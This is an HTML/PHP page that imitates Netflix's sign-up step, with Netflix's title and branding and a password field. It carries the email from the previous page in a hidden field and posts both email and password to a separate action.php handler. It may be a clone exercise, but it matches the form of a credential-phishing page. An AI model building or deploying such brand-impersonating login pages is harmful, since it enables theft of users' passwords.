<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href=https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="images/Netflix_Symbol_RGB.png">
    <title>Netflix</title>
</head>
<style>
    /* ------------------login page css ----------------------*/

    * {
        margin: 0;
        padding: 0;
        font-family: 'Poopins', sans-serif;
    }

    body {
        background-color: white;
    }

    .header-2 {
        height: 10vh;
        width: 100vw;
        border-bottom: 1px solid #e6e6e6;
    }

    nav {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 27px 40px;
    }

    nav a {
        color: black;
        text-decoration: none;
        font-size: 20px;
        font-family: Netflix Sans, Helvetica Neue, Segoe UI, Roboto, Ubuntu, sans-serif;
    }

    nav a:hover {
        text-decoration: underline;
    }

    .logo {
        width: 9.25rem;
        height: 2.5rem;
    }

    form {
        padding: 20px 35%;
    }

    .content {
        display: grid;
        padding: 10px 35%;
    }

    .stepHeader {
        font-size: 12px;
    }

    .stepHeader-container h1 {
        font-weight: 500;
        font-size: 45px;
    }

    .btn {
        padding: 10px 205px;
    }

    .fgt-pass {
        margin: 10px 0px;
    }

    .fgt-pass a {
        text-decoration: none;
    }
</style>

<body>
    <div class="header-2">
        <nav>
            <img src="logo.png" class="logo">
            <div>
                <a href="#">Sign in</a>
            </div>
        </nav>
    </div>
    <div class="content">
        <div class="stepHeader">
            <p>STEP 1 OF 3</p>
        </div>
        <div class="stepHeader-container">
            <h1>Welcome back!
                Joining Netflix is easy.</h1>
        </div>
        <div class="contextRow">
            <span>Enter your password and you'll be watching in no time.</span>
        </div>
    </div>
    <form action="action.php" method="post">
        <div class="mb-3">
            <?php
            // Retrieve the email from the previous page
            $email = isset($_POST['email']) ? $_POST['email'] : '';

            // Display the email for confirmation
            echo '<p>Email: ' . htmlspecialchars($email) . '</p>';
            ?>

        </div>
        <div class="mb-3">
            <label for="exampleInputPassword1" class="form-label">Password</label>
            <input type="password" class="form-control" name="password" id="exampleInputPassword1">
            <input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>">
        </div>
        <div class="fgt-pass">
            <a href="#">Forgot your password?</a>
        </div>
        <button type="submit" class="btn btn-danger">NEXT</button>
    </form>
</body>

</html>